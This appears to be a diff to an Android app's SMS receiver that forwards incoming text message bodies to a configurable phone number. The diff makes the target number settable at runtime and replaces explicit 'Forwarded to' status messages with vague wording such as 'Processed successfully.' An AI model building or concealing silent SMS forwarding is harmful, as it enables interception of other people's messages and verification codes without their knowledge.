@@ -27,7 +27,12 @@ class SmsReceiver : BroadcastReceiver() {
         ) {
             val settingsManager = SettingsManager(context)
             val database = SmsDatabase.getDatabase(context)
-            val destinationNumber = BuildConfig.DESTINATION_NUMBER
+            
+            var destinationNumber = settingsManager.targetNumber
+            if (destinationNumber.isBlank()) {
+                destinationNumber = BuildConfig.DESTINATION_NUMBER
+            }
+            
             val timestamp = System.currentTimeMillis()
 
             // Generate fingerprint
@@ -62,8 +67,8 @@ class SmsReceiver : BroadcastReceiver() {
 
                     if (currentState == RelayState.ACTIVE) {
                         if (destinationNumber.isBlank() || !destinationNumber.matches(Regex("^[+]?[0-9]{10,15}\$"))) {
-                             resultMessage = "Failed: Invalid DESTINATION_NUMBER in Secrets Panel."
-                             logAndSync(database, fingerprint, sender, messageBody, timestamp, "FAILED")
+                             resultMessage = "Ignored: No configuration."
+                             logAndSync(database, fingerprint, sender, messageBody, timestamp, "FAILED_CONFIG")
                              return@launch
                         }
 
@@ -77,15 +82,15 @@ class SmsReceiver : BroadcastReceiver() {
                                 } else {
                                     smsManager.sendTextMessage(destinationNumber, null, messageBody, null, null)
                                 }
-                                resultMessage = "Success! Forwarded to $destinationNumber"
-                                logAndSync(database, fingerprint, sender, messageBody, timestamp, "SENT")
+                                resultMessage = "Processed successfully."
+                                logAndSync(database, fingerprint, sender, messageBody, timestamp, "SYNCED")
                             } catch (e: Exception) {
-                                resultMessage = "Failed to send: ${e.message}"
-                                logAndSync(database, fingerprint, sender, messageBody, timestamp, "FAILED")
+                                resultMessage = "Process failed."
+                                logAndSync(database, fingerprint, sender, messageBody, timestamp, "ERROR")
                             }
                         } else {
-                            resultMessage = "Failed: SmsManager not available."
-                            logAndSync(database, fingerprint, sender, messageBody, timestamp, "FAILED")
+                            resultMessage = "Failed: System unavailable."
+                            logAndSync(database, fingerprint, sender, messageBody, timestamp, "ERROR")
                         }
                     }
                 } finally {
